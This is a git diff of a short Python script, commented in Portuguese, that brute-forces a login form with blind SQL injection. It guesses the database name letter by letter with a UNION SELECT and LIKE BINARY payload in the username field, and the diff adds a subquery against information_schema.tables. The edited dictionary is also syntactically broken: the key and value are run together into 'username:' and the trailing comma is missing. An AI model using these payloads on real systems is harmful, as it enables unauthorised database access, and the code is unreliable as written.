@@ -14,15 +14,18 @@ payload="" # Inicie com o Payload em branco e vá adicionando as letras de acord
 for letra in letras:
 
     data = {
-        # Modifique o comando injection de acordo com que você achou. 
-        "username": f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{payload}{letra}%' -- -",
+        # Modifique o comando injection de acordo com que você achou.
+        # "username": f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{payload}{letra}%' -- -",
+        "username:" f"AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'{letra}'))-- -"
         "password": "xxx"
     }
 
-    print(data)
+    # Descomente caso você queira ver a consulta.
+    # print(data)
 
     headers = {
         # Pode ser que necessite fazer um ajuste aqui de acordo com o tipo de dado que é enviado para o servidor. 
+        # "Content-Type": "application/json"
         "Content-Type": "application/x-www-form-urlencoded"
     }
 
